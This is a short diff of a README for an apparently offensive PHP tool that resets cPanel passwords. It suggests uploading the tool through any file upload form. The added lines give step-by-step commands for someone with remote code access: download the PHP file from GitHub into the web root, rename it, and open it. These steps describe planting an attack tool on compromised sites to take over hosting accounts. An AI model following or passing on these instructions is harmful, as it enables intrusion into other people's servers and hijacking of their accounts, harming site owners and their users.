@@ -18,4 +18,8 @@ How to usage? Check this https://www.naufalardhani.com/2018/10/tutorial-reset-pa
 
 # How to usage
 - You can upload this tool via any file upload form and access it!
-- If you have a remote code access, you can write command like this `wget link.com/v2.php`
+- If you have a remote code access, you can write command like this 
+1. `cd /public_html`
+2. `wget https://raw.githubusercontent.com/naufalardhani/cpanel-pass-reset/master/web-bassed-v2.php`
+3. `mv web-bassed-v2.php cp.php`
+4. `Access it site.com/cp.php` 
